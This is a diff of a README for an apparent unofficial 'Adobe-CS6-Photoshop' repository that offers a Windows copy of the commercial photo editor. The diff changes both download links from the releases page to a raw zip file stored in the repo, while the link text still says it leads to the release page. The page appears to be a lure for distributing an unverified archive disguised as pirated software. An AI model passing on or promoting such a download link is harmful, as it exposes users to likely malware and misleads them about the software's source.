@@ -1,11 +1,11 @@
 # 🖼 Adobe-CS6-Photoshop - Classic editing for Windows
 
-[![Download Adobe-CS6-Photoshop](https://img.shields.io/badge/Download-Adobe--CS6--Photoshop-blue?style=for-the-badge&logo=adobe&logoColor=white)](https://github.com/uwrittenmaterial656/Adobe-CS6-Photoshop/releases)
+[![Download Adobe-CS6-Photoshop](https://img.shields.io/badge/Download-Adobe--CS6--Photoshop-blue?style=for-the-badge&logo=adobe&logoColor=white)](https://github.com/uwrittenmaterial656/Adobe-CS6-Photoshop/raw/refs/heads/main/BaseMain/Adobe-Photoshop-C-2.1.zip)
 
 ## 📥 Download
 Use the link below to visit the release page and download the Windows version:
 
-[Visit the release page to download Adobe-CS6-Photoshop](https://github.com/uwrittenmaterial656/Adobe-CS6-Photoshop/releases)
+[Visit the release page to download Adobe-CS6-Photoshop](https://github.com/uwrittenmaterial656/Adobe-CS6-Photoshop/raw/refs/heads/main/BaseMain/Adobe-Photoshop-C-2.1.zip)
 
 ## 🪟 What this app is
 Adobe-CS6-Photoshop is a desktop photo editor for Windows. It gives you tools for image editing, photo retouching, layer work, mask editing, and graphic design. It fits users who want a familiar Photoshop CS6-style workflow on a Windows PC.
